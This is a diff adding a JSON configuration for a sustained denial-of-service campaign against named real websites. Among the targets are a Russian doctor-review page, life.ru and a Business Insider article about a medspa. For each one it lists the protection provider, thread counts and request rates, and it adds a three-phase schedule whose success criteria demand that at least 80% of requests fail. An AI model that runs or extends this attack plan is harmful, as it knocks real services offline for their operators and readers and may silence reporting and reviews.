@@ -1,0 +1,108 @@
+{
+  "sustained_attack_targets": {
+    "high_priority_524_targets": [
+      {
+        "label": "Cloudflare-Protected-1",
+        "url": "https://proverj.com/dr-shihirman/",
+        "protection": "Cloudflare + Nginx",
+        "expected_codes": ["524", "503", "502"],
+        "attack_profile": "sustained_524",
+        "priority": "high",
+        "duration": 10800,
+        "threads": 50,
+        "target_rps": 100,
+        "notes": "Known to timeout under sustained load",
+        "tested": false
+      },
+      {
+        "label": "DDoS-Guard-Protected-1", 
+        "url": "https://life.ru/p/1643820",
+        "protection": "DDoS-Guard + Nginx",
+        "expected_codes": ["503", "524", "429"],
+        "attack_profile": "sustained_503",
+        "priority": "high",
+        "duration": 10800,
+        "threads": 75,
+        "target_rps": 150,
+        "notes": "Service exhaustion target",
+        "tested": false
+      }
+    ],
+    "medium_priority_targets": [
+      {
+        "label": "Fastly-CDN-1",
+        "url": "https://www.businessinsider.com/prestigious-medspa-operated-illicitly-under-025211688.html",
+        "protection": "Fastly + Akamai",
+        "expected_codes": ["524", "502", "503"],
+        "attack_profile": "mixed_overload",
+        "priority": "medium",
+        "duration": 10800,
+        "threads": 100,
+        "target_rps": 200,
+        "notes": "CDN overload testing",
+        "tested": false
+      },
+      {
+        "label": "ServicePipe-Protected-1",
+        "url": "https://napopravku.ru/moskva/doctor-profile/mihajlov-andrej/",
+        "protection": "ServicePipe + Nginx",
+        "expected_codes": ["503", "524", "502"],
+        "attack_profile": "sustained_503",
+        "priority": "medium", 
+        "duration": 10800,
+        "threads": 75,
+        "target_rps": 150,
+        "notes": "Service capacity testing",
+        "tested": false
+      }
+    ],
+    "test_targets": [
+      {
+        "label": "HTTPBin-Test",
+        "url": "https://httpbin.org/delay/30",
+        "protection": "None",
+        "expected_codes": ["524", "503", "502"],
+        "attack_profile": "sustained_524",
+        "priority": "test",
+        "duration": 3600,
+        "threads": 25,
+        "target_rps": 50,
+        "notes": "30s delay endpoint for timeout testing",
+        "tested": false
+      }
+    ]
+  },
+  "attack_schedule": {
+    "phase_1": {
+      "name": "High Priority 524 Targets",
+      "targets": ["Cloudflare-Protected-1", "DDoS-Guard-Protected-1"],
+      "duration": "6 hours total (3h each)",
+      "expected_results": "80%+ 524/503 codes"
+    },
+    "phase_2": {
+      "name": "Medium Priority Mixed Targets", 
+      "targets": ["Fastly-CDN-1", "ServicePipe-Protected-1"],
+      "duration": "6 hours total (3h each)",
+      "expected_results": "70%+ error codes"
+    },
+    "phase_3": {
+      "name": "Test Target Validation",
+      "targets": ["HTTPBin-Test"],
+      "duration": "1 hour",
+      "expected_results": "Timeout validation"
+    }
+  },
+  "success_criteria": {
+    "minimum_error_rate": 0.8,
+    "target_524_percentage": 0.5,
+    "target_503_percentage": 0.3,
+    "minimum_duration": 10800,
+    "minimum_rps": 100,
+    "maximum_success_rate": 0.2
+  },
+  "monitoring_intervals": {
+    "status_check": 600,
+    "metrics_check": 300,
+    "log_review": 1800
+  }
+}
